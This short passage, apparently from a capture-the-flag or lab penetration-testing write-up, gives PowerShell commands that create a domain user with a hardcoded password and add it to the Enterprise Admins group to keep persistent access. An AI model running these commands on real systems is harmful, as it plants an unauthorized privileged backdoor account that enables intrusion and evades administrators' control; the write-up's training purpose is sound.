In order to maintain persistence, and allowing us to login without creating tickets, we can create a new user and add it to Enterprise Admins group, using the following PowerShell code:


`$pwd = convertTo-SecureString Capstone1@ -AsPlainText -Force`

`New-ADUser -Name kairosroot -AccountPassword $pwd `

`$User = Get-ADUser -Identity kairosroot  -Server "corpdc.corp.thereserve.loc"`

`$Group = Get-ADGroup -Identity "Enterprise Admins" -Server "rootdc.thereserve.loc"`

`Add-ADGroupMember -Identity $Group -Members $User -Server "rootdc.thereserve.loc"`
